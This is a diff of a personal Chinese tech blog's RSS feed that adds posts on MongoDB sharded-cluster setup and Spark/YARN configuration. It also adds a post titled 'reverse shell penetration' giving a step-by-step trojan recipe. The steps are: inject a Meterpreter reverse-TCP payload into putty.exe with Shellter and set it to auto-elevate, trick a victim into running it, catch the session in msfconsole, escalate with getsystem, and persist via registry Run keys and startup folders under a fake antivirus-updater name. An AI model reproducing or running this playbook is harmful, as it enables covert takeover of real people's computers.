@@ -5,9 +5,308 @@
     <description>Welcome to geek&#39;s world!</description>
     <link>https://wuyinan0126.github.io//</link>
     <atom:link href="https://wuyinan0126.github.io//feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Tue, 04 Apr 2017 13:05:06 +0800</pubDate>
-    <lastBuildDate>Tue, 04 Apr 2017 13:05:06 +0800</lastBuildDate>
+    <pubDate>Tue, 26 Sep 2017 11:17:11 +0800</pubDate>
+    <lastBuildDate>Tue, 26 Sep 2017 11:17:11 +0800</lastBuildDate>
     <generator>Jekyll v3.0.2</generator>
+    
+      <item>
+        <title>&lt;font color=&#39;red&#39;&gt;[原创]&lt;/font&gt; 大数据学习笔记(9)-NoSQL</title>
+        <description>&lt;p&gt;**&lt;/p&gt;
+
+&lt;h2 id=&quot;nosql&quot;&gt;NoSQL&lt;/h2&gt;
+&lt;hr /&gt;
+
+&lt;hr /&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;mongodb345&quot;&gt;安装MongoDB（版本3.4.5）&lt;/h2&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;section&quot;&gt;分布式架构&lt;/h3&gt;
+&lt;hr /&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;mongos server2个：cat1:12600、cat2:12600&lt;/li&gt;
+  &lt;li&gt;config server3个：cat1:12610、cat2:12610、cat3:12610&lt;/li&gt;
+  &lt;li&gt;shard server10个（数据分10片，shard[1-10]），每个分片有3个副本集：
+      * 主分片(primary)：cat[3-12]:12620
+      * 一个副本(secondary)：cat[3-12]:12621
+      * 一个仲裁(arbiter)：cat[3-12]:12622&lt;/li&gt;
+  &lt;li&gt;分片和副本集规则：对于分片n(shard[n])，主分片存放在cat[n+2]:12620，副本存放cat[n+3]:12621，仲裁存放在cat[n+4]:12622&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;section-1&quot;&gt;准备工作&lt;/h3&gt;
+&lt;hr /&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;下载&lt;a href=&quot;https://www.mongodb.org/dl/linux/x86_64&quot;&gt;MongoDB二进制包&lt;/a&gt;，解压至/opt/:&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible all -m copy -a &#39;src=/home/cat/cat/archive/mongodb-linux-x86_64-ubuntu1404-v3.4-latest.tgz dest=/home/cat/cat/&#39;
+ $ ansible all -a &#39;tar -zxvf /home/cat/cat/mongodb-linux-x86_64-ubuntu1404-v3.4-latest.tgz -C /opt/&#39;
+ $ ansible all -a &#39;mv /opt/mongodb-linux-x86_64-ubuntu1404-3.4.5-45-gecfb3fb /opt/mongodb-3.4.5&#39;
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;创建MongoDB相关目录，mongos、config、primary、secondary、arbiter五个目录，因为mongos不存储数据，只需要建立日志文件目录即可:&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # 建立mongos server日志文件存放目录、config server的数据和日志存放目录
+ $ ansible all -a &#39;mkdir -p /opt/mongodb-3.4.5/var/mongos/log /opt/mongodb-3.4.5/var/config/data /opt/mongodb-3.4.5/var/config/log&#39;
+ # 建立副本集的数据文件和日志存放目录
+ $ ansible all -a &#39;mkdir -p /opt/mongodb-3.4.5/var/primary/data /opt/mongodb-3.4.5/var/primary/log /opt/mongodb-3.4.5/var/secondary/data /opt/mongodb-3.4.5/var/secondary/log /opt/mongodb-3.4.5/var/arbiter/data /opt/mongodb-3.4.5/var/arbiter/log&#39;
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;mongodb&quot;&gt;启动MongoDB&lt;/h3&gt;
+&lt;hr /&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;在每个config server节点启动配置服务器。configReplSet为自定义副本集名称，接下来启动mongos也会用到该replSetName&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible zookeeper -a &#39;sudo /opt/mongodb-3.4.5/bin/mongod --configsvr --replSet configReplSet --dbpath /opt/mongodb-3.4.5/var/config/data --port 12610 --logpath /opt/mongodb-3.4.5/var/config/log/config.log --fork&#39;
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;连接到任意一台配置服务器上，初始化配置副本集&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ mongo cat1:12610
+ &amp;gt; rs.initiate({_id:&quot;configReplSet&quot;,configsvr:true,members:[{_id:0,host:&quot;10.2.2.141:12610&quot;},{_id:1,host:&quot;10.2.2.142:12610&quot;},{_id:2,host:&quot;10.2.2.143:12610&quot;}]})
+ { &quot;ok&quot; : 1 }
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;在每个shard server节点配置10个分片的3个副本集，如第一个分片shard1，primary分片在cat3:12620，副本secondary在cat4:12621，仲裁arbiter在cat5:12622，以此类推&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; cat@cat3 $ sudo /opt/mongodb-3.4.5/bin/mongod --shardsvr --replSet shard1 --port 12620 --dbpath /opt/mongodb-3.4.5/var/primary/data --logpath /opt/mongodb-3.4.5/var/primary/log/primary.log --fork --nojournal --oplogSize 1024
+
+ cat@cat4 $ sudo /opt/mongodb-3.4.5/bin/mongod --shardsvr --replSet shard1 --port 12621 --dbpath /opt/mongodb-3.4.5/var/secondary/data --logpath /opt/mongodb-3.4.5/var/secondary/log/secondary.log --fork --nojournal --oplogSize 1024
+
+ cat@cat5 $ sudo /opt/mongodb-3.4.5/bin/mongod --shardsvr --replSet shard1 --port 12622 --dbpath /opt/mongodb-3.4.5/var/arbiter/data --logpath /opt/mongodb-3.4.5/var/arbiter/log/arbiter.log --fork --nojournal --oplogSize 1024
+
+ # 对于第一个shard1，在cat@cat3执行以下的命令即可
+ sudo /opt/mongodb-3.4.5/bin/mongod --shardsvr --replSet shard1 --port 12620 --dbpath /opt/mongodb-3.4.5/var/primary/data --logpath /opt/mongodb-3.4.5/var/primary/log/primary.log --fork --nojournal --oplogSize 1024
+ sudo /opt/mongodb-3.4.5/bin/mongod --shardsvr --replSet shard10 --port 12621 --dbpath /opt/mongodb-3.4.5/var/secondary/data --logpath /opt/mongodb-3.4.5/var/secondary/log/secondary.log --fork --nojournal --oplogSize 1024
+ sudo /opt/mongodb-3.4.5/bin/mongod --shardsvr --replSet shard9 --port 12622 --dbpath /opt/mongodb-3.4.5/var/arbiter/data --logpath /opt/mongodb-3.4.5/var/arbiter/log/arbiter.log --fork --nojournal --oplogSize 1024
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;登陆每个shard server，初始化分片副本集配置&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ mongo cat3:12620
+ &amp;gt; use admin
+ &amp;gt; rs.initiate({_id:&quot;shard1&quot;,members:[{_id:0,host:&quot;10.2.2.143:12620&quot;},{_id:1,host:&quot;10.2.2.144:12621&quot;},{_id:2,host:&quot;10.2.2.145:12622&quot;}]})
+
+ $ mongo cat4:12620
+ &amp;gt; use admin
+ &amp;gt; rs.initiate({_id:&quot;shard2&quot;,members:[{_id:0,host:&quot;10.2.2.144:12620&quot;},{_id:1,host:&quot;10.2.2.145:12621&quot;},{_id:2,host:&quot;10.2.2.146:12622&quot;}]})
+
+ ...
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;在每个mongos server节点分别启动mongos服务器&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible zookeeper -a &#39;sudo /opt/mongodb-3.4.5/bin/mongos --configdb configReplSet/10.2.2.141:12610,10.2.2.142:12610 --port 12600 --logpath /opt/mongodb-3.4.5/var/mongos/log/mongos.log --fork&#39;
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;连接到任意一台mongos服务器上，添加分片到集群&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ mongo cat1:12600
+ mongos&amp;gt; sh.addShard(&quot;shard1/10.2.2.143:12620,10.2.2.144:12621,10.2.2.145:12622&quot;)
+ mongos&amp;gt; sh.addShard(&quot;shard2/10.2.2.144:12620,10.2.2.145:12621,10.2.2.146:12622&quot;)
+ ...
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;mongodb-1&quot;&gt;测试MongoDB&lt;/h3&gt;
+&lt;hr /&gt;
+
+&lt;hr /&gt;
+</description>
+        <pubDate>Thu, 22 Jun 2017 08:00:00 +0800</pubDate>
+        <link>https://wuyinan0126.github.io//2017/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(9)-NoSQL/</link>
+        <guid isPermaLink="true">https://wuyinan0126.github.io//2017/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(9)-NoSQL/</guid>
+        
+        <category>原创</category>
+        
+        <category>大数据</category>
+        
+        
+        <category>原创</category>
+        
+        <category>大数据</category>
+        
+      </item>
+    
+      <item>
+        <title>&lt;font color=&#39;red&#39;&gt;[原创]&lt;/font&gt; 反弹shell渗透</title>
+        <description>&lt;p&gt;**&lt;/p&gt;
+
+&lt;h2 id=&quot;shell&quot;&gt;反弹shell渗透&lt;/h2&gt;
+&lt;hr /&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;下载一个二进制文件，如putty.exe，使用ResHacker加入管理员运行权限：&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&amp;gt;
+ &amp;lt;!-- Copyright (c) Microsoft Corporation --&amp;gt;
+ &amp;lt;assembly xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot;  xmlns:asmv3=&quot;urn:schemas-microsoft-com:asm.v3&quot; manifestVersion=&quot;1.0&quot;&amp;gt;
+ &amp;lt;assemblyIdentity version=&quot;1.0.0.0&quot; processorArchitecture=&quot;x86&quot; name=&quot;Microsoft.Windows.MF.rrinstaller&quot; type=&quot;win32&quot;/&amp;gt;
+ &amp;lt;trustInfo xmlns=&quot;urn:schemas-microsoft-com:asm.v3&quot;&amp;gt;
+         &amp;lt;security&amp;gt;
+             &amp;lt;requestedPrivileges&amp;gt;
+                 &amp;lt;requestedExecutionLevel level=&quot;requireAdministrator&quot; uiAccess=&quot;false&quot;/&amp;gt;
+             &amp;lt;/requestedPrivileges&amp;gt;
+         &amp;lt;/security&amp;gt;
+     &amp;lt;/trustInfo&amp;gt;
+     &amp;lt;asmv3:application&amp;gt;
+        &amp;lt;asmv3:windowsSettings xmlns=&quot;http://schemas.microsoft.com/SMI/2005/WindowsSettings&quot;&amp;gt;
+             &amp;lt;autoElevate&amp;gt;true&amp;lt;/autoElevate&amp;gt;
+        &amp;lt;/asmv3:windowsSettings&amp;gt;
+     &amp;lt;/asmv3:application&amp;gt;
+ &amp;lt;/assembly&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;使用shellter动态插入反弹shell代码，如为管理员运行权限的exe文件，则shellter也需管理员权限运行：&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; Choose Operation Mode - Auto/Manual (A/M/H): A
+
+ Perform Online Version Check? (Y/N/H): N
+
+ PE Target: {exe文件路径}
+
+ ************
+ * Payloads *
+ ************
+
+ [1] Meterpreter_Reverse_TCP   [stager]
+ [2] Meterpreter_Reverse_HTTP  [stager]
+ [3] Meterpreter_Reverse_HTTPS [stager]
+ [4] Meterpreter_Bind_TCP      [stager]
+ [5] Shell_Reverse_TCP         [stager]
+ [6] Shell_Bind_TCP            [stager]
+ [7] WinExec
+
+ Use a listed payload or custom? (L/C/H): L
+
+ Select payload by index: 1
+
+ ***************************
+ * meterpreter_reverse_tcp *
+ ***************************
+
+ SET LHOST: {IP}
+
+ SET LPORT: {PORT}
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;通过社会工程学的方法让victim运行该程序（管理员权限）&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;运行渗透脚本，开启监听：&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; echo &#39;
+ use exploit/multi/handler
+ set payload windows/meterpreter/reverse_tcp
+ set LHOST 0.0.0.0
+ set LPORT 4444
+ set EXITONSESSIONS false
+ exploit -j
+ &#39; &amp;gt; ./exploit.rc
+
+ sudo msfconsole -r ./exploit.rc
+
+ rm -rf ./exploit.rc
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;当victim接入后，在msfconsole中：&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; msf exploit(handler) &amp;gt; [*] Sending stage (957487 bytes) to {VICTIM_IP}
+ [*] Meterpreter session 1 opened ({VICTIM_IP}:4444 -&amp;gt; {VICTIM_IP}:50138) at ...
+
+ msf exploit(handler) &amp;gt; sessions -i 1
+ # 查看权限
+ meterpreter &amp;gt; run post/windows/gather/win_privs 
+
+ Current User
+ ============
+
+  Is Admin  Is System  Is In Local Admin Group  UAC Enabled  Foreground ID  UID
+  --------  ---------  -----------------------  -----------  -------------  ---
+  True      False      True                     True         1              &quot;&quot;
+
+ meterpreter &amp;gt; getsystem 
+ ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+
+ Current User
+ ============
+
+  Is Admin  Is System  Is In Local Admin Group  UAC Enabled  Foreground ID  UID
+  --------  ---------  -----------------------  -----------  -------------  ---
+  True      True       True                     False        1              &quot;&quot;
+
+ meterpreter &amp;gt; ls C:\\Users
+
+ # 管理员运行权限的exe文件，注册表添加开机启动
+ meterpreter &amp;gt; upload ./Secured.exe C:\\Users\\{USER}\\AppData\\Roaming\\Microsoft\\Windows\\病毒库更新程序.exe
+ meterpreter &amp;gt; reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v Secured -d &#39;C:\Users\{USER}\AppData\Roaming\Microsoft\Windows\病毒库更新程序.exe&#39;
+	
+ # 管理员运行权限的exe文件，开机启动项添加开机启动
+ meterpreter &amp;gt; upload ./Secured.exe &quot;C:\\Users\\{USER}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Secured.exe&quot;
+
+ # 非管理员运行权限的exe文件，注册表添加开机启动
+ meterpreter &amp;gt; upload ./Protected.exe C:\\Users\\{USER}\\Protected.exe
+ meterpreter &amp;gt; reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v Protected -d &#39;C:\Users\{USER}\Protected.exe&#39;
+
+ # 非管理员运行权限的exe文件，开机启动项添加开机启动
+ meterpreter &amp;gt; upload ./Protected.exe &quot;C:\\Users\\{USER}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Protected.exe&quot;
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;strong&gt;未完待续&lt;/strong&gt;&lt;/p&gt;
+</description>
+        <pubDate>Wed, 03 May 2017 08:00:00 +0800</pubDate>
+        <link>https://wuyinan0126.github.io//2017/%E5%8F%8D%E5%BC%B9shell%E6%B8%97%E9%80%8F/</link>
+        <guid isPermaLink="true">https://wuyinan0126.github.io//2017/%E5%8F%8D%E5%BC%B9shell%E6%B8%97%E9%80%8F/</guid>
+        
+        <category>原创</category>
+        
+        <category>技术宅</category>
+        
+        
+        <category>原创</category>
+        
+        <category>技术宅</category>
+        
+      </item>
     
       <item>
         <title>&lt;font color=&#39;red&#39;&gt;[原创]&lt;/font&gt; TAP平台搭建和使用笔记</title>
@@ -1293,6 +1592,44 @@
 &lt;/code&gt;&lt;/pre&gt;
     &lt;/div&gt;
   &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;使用spark_shuffle，修改$HADOOP_HOME/etc/hadoop/yarn-site.xml:&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;property&amp;gt;
+   &amp;lt;name&amp;gt;yarn.nodemanager.aux-services&amp;lt;/name&amp;gt;
+   &amp;lt;value&amp;gt;mapreduce_shuffle,spark_shuffle&amp;lt;/value&amp;gt;
+ &amp;lt;/property&amp;gt;
+ &amp;lt;property&amp;gt;
+   &amp;lt;name&amp;gt;yarn.nodemanager.aux-services.spark_shuffle.class&amp;lt;/name&amp;gt;
+   &amp;lt;value&amp;gt;org.apache.spark.network.yarn.YarnShuffleService&amp;lt;/value&amp;gt;
+ &amp;lt;/property&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;配置了5之后需要将spark的yarn目录里的spark-2.1.0-yarn-shuffle.jar加入yarn classpath:&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ yarn classpath
+ # 将spark-network-shuffle_2.11-2.1.0.jar放入上述输出的某一路径中，如/opt/hadoop-2.7.3/share/hadoop/yarn/lib/下
+ $ ansible all -a &#39;cp /opt/spark-2.1.0/yarn/spark-2.1.0-yarn-shuffle.jar /opt/hadoop-2.7.3/share/hadoop/yarn/&#39;
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;配置了5之后需要修改$HADOOP_HOME/etc/hadoop/yarn-env.sh:&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # 因为使用了spark_shuffle，因此需要提高YARN_HEAPSIZE，避免在shuffle过程中的garbage collection问题
+ YARN_HEAPSIZE=5000
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;分发Hadoop配置文件&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible slave -m copy -a &#39;src=/opt/hadoop-2.7.3/etc/hadoop/ dest=/opt/hadoop-2.7.3/etc/hadoop/&#39;
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
 &lt;/ol&gt;
 
 &lt;hr /&gt;
@@ -1384,6 +1721,22 @@
 &lt;h2 id=&quot;section&quot;&gt;分布式协调系统&lt;/h2&gt;
 &lt;hr /&gt;
 
+&lt;p&gt;分布式协调系统处理分布式环境下的协调管理问题，例如：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;当系统中加入一个新进程或节点时，如何自动获得配置参数&lt;/li&gt;
+  &lt;li&gt;当配置参数被某个进程或节点修改时，如何实时通知被影响的进程或节点&lt;/li&gt;
+  &lt;li&gt;当主节点发生故障时，如何快速选举出新的主节点&lt;/li&gt;
+  &lt;li&gt;如何在分布式环境中实现锁服务&lt;/li&gt;
+  &lt;li&gt;如何在多个进程或节点间实现任务同步&lt;/li&gt;
+  &lt;li&gt;如何判断集群中某个节点是否存活&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;分布式协调系统中较著名的系统有Google的Chubby分布式锁服务和Yahoo的ZooKeeper协调系统。&lt;/p&gt;
+
+&lt;h2 id=&quot;zookeeper&quot;&gt;Zookeeper&lt;/h2&gt;
+&lt;hr /&gt;
+
 &lt;h2 id=&quot;zookeeper349&quot;&gt;安装Zookeeper（版本3.4.9）&lt;/h2&gt;
 &lt;hr /&gt;
 
@@ -1415,7 +1768,7 @@
 
 &lt;hr /&gt;
 
-&lt;h3 id=&quot;zookeeper&quot;&gt;配置Zookeeper&lt;/h3&gt;
+&lt;h3 id=&quot;zookeeper-1&quot;&gt;配置Zookeeper&lt;/h3&gt;
 &lt;hr /&gt;
 
 &lt;ol&gt;
@@ -1467,7 +1820,7 @@
 
 &lt;hr /&gt;
 
-&lt;h3 id=&quot;zookeeper-1&quot;&gt;分发Zookeeper配置文件&lt;/h3&gt;
+&lt;h3 id=&quot;zookeeper-2&quot;&gt;分发Zookeeper配置文件&lt;/h3&gt;
 &lt;hr /&gt;
 
 &lt;ol&gt;
@@ -1492,7 +1845,7 @@
 
 &lt;hr /&gt;
 
-&lt;h3 id=&quot;zookeeper-2&quot;&gt;启动Zookeeper&lt;/h3&gt;
+&lt;h3 id=&quot;zookeeper-3&quot;&gt;启动Zookeeper&lt;/h3&gt;
 &lt;hr /&gt;
 
 &lt;ol&gt;
@@ -1507,7 +1860,7 @@
 
 &lt;hr /&gt;
 
-&lt;h3 id=&quot;zookeeper-3&quot;&gt;测试Zookeeper&lt;/h3&gt;
+&lt;h3 id=&quot;zookeeper-4&quot;&gt;测试Zookeeper&lt;/h3&gt;
 &lt;hr /&gt;
 
 &lt;ol&gt;
@@ -2166,6 +2519,8 @@ $ python yarn-utils.py -c 4 -m 16 -d 1 -k True
     &lt;p&gt;etc/hadoop/yarn-env.sh&lt;/p&gt;
 
     &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; export JAVA_HOME=/opt/jdk1.8.0_121
+ # 因为使用了spark_shuffle，因此需要提高YARN_HEAPSIZE，避免在shuffle过程中的garbage collection问题
+ YARN_HEAPSIZE=5000
 &lt;/code&gt;&lt;/pre&gt;
     &lt;/div&gt;
   &lt;/li&gt;
@@ -2237,11 +2592,15 @@ $ python yarn-utils.py -c 4 -m 16 -d 1 -k True
    &amp;lt;/property&amp;gt;
    &amp;lt;property&amp;gt;  
      &amp;lt;name&amp;gt;yarn.nodemanager.aux-services&amp;lt;/name&amp;gt;  
-     &amp;lt;value&amp;gt;mapreduce_shuffle&amp;lt;/value&amp;gt;  
+     &amp;lt;value&amp;gt;mapreduce_shuffle,spark_shuffle&amp;lt;/value&amp;gt;  
    &amp;lt;/property&amp;gt;
    &amp;lt;property&amp;gt;
      &amp;lt;name&amp;gt;yarn.nodemanager.aux-services.mapreduce_shuffle.class&amp;lt;/name&amp;gt;
      &amp;lt;value&amp;gt;org.apache.hadoop.mapred.ShuffleHandler&amp;lt;/value&amp;gt;
+   &amp;lt;/property&amp;gt;
+   &amp;lt;property&amp;gt;
+     &amp;lt;name&amp;gt;yarn.nodemanager.aux-services.spark_shuffle.class&amp;lt;/name&amp;gt;
+     &amp;lt;value&amp;gt;org.apache.spark.network.yarn.YarnShuffleService&amp;lt;/value&amp;gt;
    &amp;lt;/property&amp;gt;
    &amp;lt;property&amp;gt;  
      &amp;lt;name&amp;gt;yarn.resourcemanager.scheduler.class&amp;lt;/name&amp;gt;
@@ -2453,719 +2812,6 @@ $ python yarn-utils.py -c 4 -m 16 -d 1 -k True
         <category>原创</category>
         
         <category>大数据</category>
-        
-      </item>
-    
-      <item>
-        <title>&lt;font color=&#39;red&#39;&gt;[原创]&lt;/font&gt; 大数据学习笔记(1)-Overview</title>
-        <description>&lt;p&gt;&lt;em&gt;系统学习大数据生态圈中的理论知识和常用工具，并通过ansible集群管理工具在12台物理机上搭建分布式的大数据平台，包括Hadoop、Spark、Hive、Zookeeper、Kafka等常用大数据工具及其涉及的理论知识&lt;/em&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;section&quot;&gt;环境配置&lt;/h2&gt;
-&lt;hr /&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;12台DELL T1700图形工作站，每台配置：&lt;/p&gt;
-
-    &lt;ul&gt;
-      &lt;li&gt;CPU：1颗4核8线程&lt;/li&gt;
-      &lt;li&gt;内存：16GB DDR3&lt;/li&gt;
-      &lt;li&gt;存储：1TB TOSHIBA DT01ACA100&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;section-1&quot;&gt;大数据平台架构&lt;/h2&gt;
-&lt;hr /&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/2016-11-16-1.jpeg&quot; alt=&quot;大数据平台架构&quot; title=&quot;大数据平台架构&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;section-2&quot;&gt;准备工作&lt;/h2&gt;
-&lt;hr /&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;在所有节点配置sudo免密码：&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ sudo visudo -f /etc/sudoers
- ...
- %sudo   ALL=(ALL:ALL) ALL
- cat     ALL=(ALL) NOPASSWD:NOPASSWD:ALL
- ...
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;(在主节点)使用集群管理工具ansible：&lt;/p&gt;
-
-    &lt;ol&gt;
-      &lt;li&gt;
-        &lt;p&gt;在cat1中生成密钥对，并将公钥加入各节点authorized_keys中：&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ssh-keygen -t rsa
- $ cat id_rsa.pub &amp;gt;&amp;gt; ~/.ssh/authorized_keys
- $ scp ~/.ssh/authorized_keys cat@cat[2:12]:/home/cat/.ssh/authorized_keys
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-      &lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;安装ansible：&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ sudo apt-get install ansible
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-      &lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;修改配置文件/etc/ansible/hosts，加入：&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; [all]
- cat[1:12]
-
- [master]
- cat1
-
- [slave]
- cat[2:12]
-
- [zookeeper]
- cat[1:3]
-
- [namenode]
- cat[1:2]
-
- [datanode]
- cat[3:12]
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-      &lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;测试：&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible master -m ping 
- $ ansible slave -m ping 
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-      &lt;/li&gt;
-    &lt;/ol&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;修改/etc/hosts文件，加入：&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # 【坑】注释掉127.0.1.1	{主机名}
- 10.2.2.141      cat1
- 10.2.2.142      cat2
- 10.2.2.143      cat3
- 10.2.2.144      cat4
- 10.2.2.145      cat5
- 10.2.2.146      cat6
- 10.2.2.147      cat7
- 10.2.2.148      cat8
- 10.2.2.149      cat9
- 10.2.2.150      cat10
- 10.2.2.151      cat11
- 10.2.2.152      cat12
-
- $ ansible slave -s -m copy -a &#39;src=/etc/hosts dest=/etc/&#39;
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;编写ansible-playbook文件init.yml：&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ---
-
- - hosts: all
-   tasks:
-
-   - name: turn off ufw			# 关闭防火墙
-     shell: iptables -F
